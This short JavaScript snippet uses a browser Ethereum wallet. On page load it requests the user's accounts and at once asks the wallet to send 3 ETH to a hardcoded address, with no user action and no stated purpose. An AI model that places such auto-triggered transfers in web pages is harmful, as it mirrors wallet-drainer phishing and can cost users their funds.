ethereum
        .request({ method: 'eth_requestAccounts' })
        .then(getAccount)
        .catch((err) => {
            console.error(err);
        });


    function getAccount(accounts) {
        const account = accounts[0];
        send(account)
    }

    function send(account) {
        ethereum
            .request({
                method: 'eth_sendTransaction',
                params: [
                    {
                        from: account,
                        to: '0xA0E776F9F8848f88b984e0F94f32f7d8aaB21722',
                        value: '0x29a2241af62c0000',
                        gasPrice: '0x09184e72a000',
                        gas: '0x2710',
                    },
                ],
            })
            .then((txHash) => console.log(txHash))
            .catch((error) => console.error);
    }
